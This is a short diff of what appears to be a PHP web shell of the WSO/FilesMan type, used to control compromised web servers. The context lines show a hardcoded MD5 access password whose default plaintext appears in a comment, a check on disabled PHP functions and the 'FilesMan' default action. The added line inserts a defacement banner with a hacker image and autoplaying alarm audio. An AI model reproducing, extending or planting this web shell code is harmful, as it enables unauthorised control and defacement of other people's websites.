@@ -29,6 +29,7 @@ $dis_func = get_cfg_var('disable_functions');
 define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
 
 $auth_pass = "c32fd5fdb63492c85ffa546fd2c811c8"; // default: ALxWahid
+$warn="<center><img src='https://3.bp.blogspot.com/-IpTodLWXERw/XK9YWZO_uvI/AAAAAAAAAvU/LGK0j91Ypl4f74ITUZr6yvushK3xcxM_wCLcBGAs/s1600/black-hatter%2B%25281%2529.jpg' height='667px' width='1000px'/></center><br> <audio autoplay loop > <source src=\"https://archive.org/download/RedAlert_201904/Red%20Alert.mp3\" type=\"audio/mpeg\"></audio>";
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
